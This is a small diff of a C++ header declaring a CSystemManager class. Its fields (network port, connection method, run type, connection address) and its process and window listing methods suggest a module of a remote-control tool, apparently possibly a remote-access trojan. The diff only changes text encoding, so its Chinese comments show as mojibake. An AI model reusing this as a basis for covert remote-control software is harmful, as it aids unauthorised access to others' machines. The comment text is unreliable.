@@ -1,4 +1,4 @@
-// SystemManager.h: interface for the CSystemManager class.
+ï»¿// SystemManager.h: interface for the CSystemManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -24,10 +24,10 @@ public:
 	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
 	
 private:
-	UINT    NetPort;    //Á¬½Ó¶Ë¿Ú
-    UCHAR   NetLine;    //Á¬½Ó·½Ê½
-    UCHAR   NetOpert;   //ÔËĞĞÀàĞÍ
-    CHAR *Linkaddress;  //Á¬½ÓµØÖ·
+	UINT    NetPort;    //è¿æ¥ç«¯å£
+    UCHAR   NetLine;    //è¿æ¥æ–¹å¼
+    UCHAR   NetOpert;   //è¿è¡Œç±»å‹
+    CHAR *Linkaddress;  //è¿æ¥åœ°å€
 
 	LPBYTE getProcessList();
 	LPBYTE getWindowsList();
